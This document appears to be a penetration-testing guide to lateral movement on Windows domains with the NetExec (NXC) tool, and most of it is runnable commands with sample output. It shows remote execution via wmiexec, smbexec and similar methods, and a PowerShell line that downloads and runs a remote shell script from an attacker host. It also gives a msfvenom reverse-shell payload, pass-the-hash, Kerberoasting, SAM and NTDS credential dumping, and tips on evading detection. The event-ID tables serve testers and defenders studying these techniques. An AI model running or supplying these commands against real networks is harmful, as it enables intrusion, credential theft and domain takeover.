# Lateral Movement with NXC

## Command Execution Methods

NXC supports multiple methods for executing commands on remote hosts. Each method has different OPSEC characteristics, requirements, and artifacts.

### Execution Method Overview

| Method | Flag | Protocol | Service Created | OPSEC Level | Requires Admin |
|--------|------|----------|-----------------|-------------|---------------|
| wmiexec | `--exec-method wmiexec` | WMI/DCOM | No | Best | Yes |
| smbexec | `--exec-method smbexec` | SMB | Yes (temporary) | Poor | Yes |
| atexec | `--exec-method atexec` | Task Scheduler | No (scheduled task) | Moderate | Yes |
| mmcexec | `--exec-method mmcexec` | MMC/DCOM | No | Good | Yes |

The default execution method is **wmiexec**.

---

## Command Execution: -x (cmd.exe) vs -X (PowerShell)

### cmd.exe Execution (-x)

```bash
# Execute a cmd.exe command
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami'
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Executing command via wmiexec
SMB         192.168.1.20    445    WS01             corp\administrator
```

```bash
# Multiple commands
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'ipconfig /all'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'net user /domain'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'net localgroup administrators'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'tasklist /svc'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'systeminfo'
```

### PowerShell Execution (-X)

```bash
# Execute a PowerShell command
nxc smb 192.168.1.20 -u administrator -p 'Password123' -X 'Get-Process'
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Executing command via wmiexec
SMB         192.168.1.20    445    WS01             Handles  NPM(K)    PM(K)      WS(K) CPU(s)     Id  SI ProcessName
SMB         192.168.1.20    445    WS01             -------  ------    -----      ----- ------     --  -- -----------
SMB         192.168.1.20    445    WS01                  234      13     2500     10248   0.03   4524   1 cmd
...
```

```bash
# PowerShell one-liners
nxc smb 192.168.1.20 -u administrator -p 'Password123' -X 'Get-LocalUser | Select Name,Enabled'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -X 'Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -X '$env:COMPUTERNAME'
```

### Execution Across Multiple Hosts

```bash
# Execute on all hosts where you have admin access
nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -x 'hostname'
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             WS01
SMB         192.168.1.25    445    SQL01            [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.25    445    SQL01            SQL01
SMB         192.168.1.30    445    FILE01           [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.30    445    FILE01           FILE01
```

---

## Execution Method Details

### wmiexec (default)

Uses Windows Management Instrumentation (WMI) over DCOM to execute commands.

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method wmiexec
```

**Pros:**
- No service created on the target
- No files dropped to disk (initially)
- Less likely to trigger endpoint detection

**Cons:**
- Output is written to a temporary file on the target share (then read back and deleted)
- Requires DCOM access (port 135 + dynamic high ports)
- Can be detected by WMI activity monitoring

**Artifacts:**
- Event ID 4624 (Type 3 logon)
- WMI activity in WMI-Activity/Operational log
- Temporary file creation on ADMIN$ share

### smbexec

Creates a temporary Windows service to execute commands.

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method smbexec
```

**Pros:**
- Works when WMI/DCOM is blocked
- Only requires SMB (port 445)

**Cons:**
- Creates a service on the target (Event ID 7045)
- Very noisy — easily detected
- Service name contains random characters (suspicious)
- Leaves artifacts in the System event log

**Artifacts:**
- Event ID 7045: New service installed (service name looks random)
- Event ID 4624 (Type 3 logon)
- cmd.exe process creation

### atexec

Uses the Windows Task Scheduler to execute commands.

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method atexec
```

**Pros:**
- No service created
- Scheduled tasks are common in enterprise environments (blends in)

**Cons:**
- Creates a scheduled task (briefly visible)
- Output written to a file then retrieved
- Task Scheduler logs may capture it

**Artifacts:**
- Event ID 4698: Scheduled task created
- Event ID 4699: Scheduled task deleted
- Event ID 4624 (Type 3 logon)

### mmcexec

Uses MMC (Microsoft Management Console) DCOM objects for execution.

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'whoami' --exec-method mmcexec
```

**Pros:**
- No service created
- Less commonly monitored than WMI
- Good alternative when wmiexec is detected

**Cons:**
- Requires DCOM access
- Less reliable than wmiexec on some OS versions

---

## File Transfer Operations

### Upload Files (--put-file)

```bash
# Upload a file to the target
nxc smb 192.168.1.20 -u administrator -p 'Password123' --put-file /tmp/payload.exe 'C:\Windows\Temp\payload.exe'
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Copying /tmp/payload.exe to C:\Windows\Temp\payload.exe
SMB         192.168.1.20    445    WS01             [+] File successfully uploaded
```

### Download Files (--get-file)

```bash
# Download a file from the target
nxc smb 192.168.1.20 -u administrator -p 'Password123' --get-file 'C:\Windows\System32\config\SAM' /tmp/SAM
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Copying C:\Windows\System32\config\SAM to /tmp/SAM
SMB         192.168.1.20    445    WS01             [+] File successfully downloaded
```

### Common File Transfer Scenarios

```bash
# Upload and execute a binary
nxc smb 192.168.1.20 -u administrator -p 'Password123' --put-file /tmp/SharpHound.exe 'C:\Windows\Temp\sh.exe'
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'C:\Windows\Temp\sh.exe -c All --zipfilename loot.zip'
nxc smb 192.168.1.20 -u administrator -p 'Password123' --get-file 'C:\Windows\Temp\loot.zip' /tmp/loot.zip

# Download important files for offline analysis
nxc smb 192.168.1.20 -u administrator -p 'Password123' --get-file 'C:\inetpub\wwwroot\web.config' /tmp/web.config
```

---

## Executing Payloads and Reverse Shells

### PowerShell Reverse Shell

```bash
# Execute a PowerShell reverse shell (Base64 encoded for reliability)
nxc smb 192.168.1.20 -u administrator -p 'Password123' -X 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.5/shell.ps1")'
```

### Metasploit Integration

```bash
# Generate a payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe

# Upload via NXC
nxc smb 192.168.1.20 -u administrator -p 'Password123' --put-file shell.exe 'C:\Windows\Temp\shell.exe'

# Execute via NXC
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'C:\Windows\Temp\shell.exe'
```

### Using NXC with PTH for Execution

```bash
# Execute commands using a hash instead of a password
nxc smb 192.168.1.20 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' -x 'whoami'
```

---

## Lateral Movement Patterns

### Pattern 1: Credential Reuse Check

```bash
# Found creds on one host, check everywhere
nxc smb 192.168.1.0/24 -u compromised_user -p 'FoundPassword!'

# For local admin hash reuse
nxc smb 192.168.1.0/24 -u administrator -H 'hash_from_sam_dump' --local-auth
```

### Pattern 2: Cascading Credential Extraction

```bash
# Step 1: Dump SAM on first compromised host
nxc smb 192.168.1.20 -u admin -p 'Password123' --sam

# Step 2: Use local admin hash on other hosts
nxc smb 192.168.1.0/24 -u administrator -H '<hash_from_step1>' --local-auth --sam

# Step 3: Each new SAM dump may reveal more credentials to try
```

### Pattern 3: Domain Escalation via Service Accounts

```bash
# Step 1: Kerberoast to find service account tickets
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --kerberoasting krb.txt

# Step 2: Crack the ticket offline
hashcat -m 13100 krb.txt rockyou.txt

# Step 3: Use the cracked service account credential
nxc smb 192.168.1.0/24 -u svc_sql -p 'CrackedPassword!'

# Step 4: If admin on any host, dump more secrets
nxc smb 192.168.1.25 -u svc_sql -p 'CrackedPassword!' --sam --lsa
```

### Pattern 4: Full Domain Compromise

```bash
# Once you have Domain Admin access, DCSync everything
nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds

# Or with a hash
nxc smb 192.168.1.10 -u administrator -H 'da_hash' --ntds

# Use krbtgt hash for Golden Ticket (with Mimikatz/Rubeus, not NXC directly)
```

---

## WinRM Execution

If SMB execution is blocked, WinRM may be available:

```bash
# Execute via WinRM (port 5985)
nxc winrm 192.168.1.20 -u administrator -p 'Password123' -x 'whoami'

# PowerShell via WinRM
nxc winrm 192.168.1.20 -u administrator -p 'Password123' -X 'Get-Process'
```

**WinRM output format:**
```
WINRM       192.168.1.20    5985   WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
WINRM       192.168.1.20    5985   WS01             corp\administrator
```

---

## Lateral Movement OPSEC Comparison

| Technique | Detection Risk | Event IDs | Artifacts |
|-----------|---------------|-----------|-----------|
| PTH via SMB | Medium | 4624 (Type 3), 4776 | NTLM auth in security log |
| wmiexec | Low-Medium | 4624, WMI-Activity | Temp file on ADMIN$ |
| smbexec | High | 4624, 7045 | Service creation, cmd.exe |
| atexec | Medium | 4624, 4698, 4699 | Scheduled task create/delete |
| WinRM | Medium | 4624 (Type 3), 91 (WSMan) | PowerShell logging |
| PTT/Kerberos | Low | 4768, 4769 | Kerberos ticket requests |

---

## Command Execution on Multiple Hosts Simultaneously

NXC can execute commands across many hosts at once:

```bash
# Run hostname on all admin-accessible hosts
nxc smb 192.168.1.0/24 -u administrator -H 'hash' -x 'hostname'

# Collect local admin group membership across the network
nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -x 'net localgroup administrators'

# Check AV status across the network
nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -X 'Get-MpComputerStatus | Select AMRunningMode,RealTimeProtectionEnabled'
```

**Thread control for mass execution:**
```bash
# Limit threads to avoid network congestion and detection
nxc smb 192.168.1.0/24 -u administrator -p 'Password123' -x 'hostname' -t 10
```
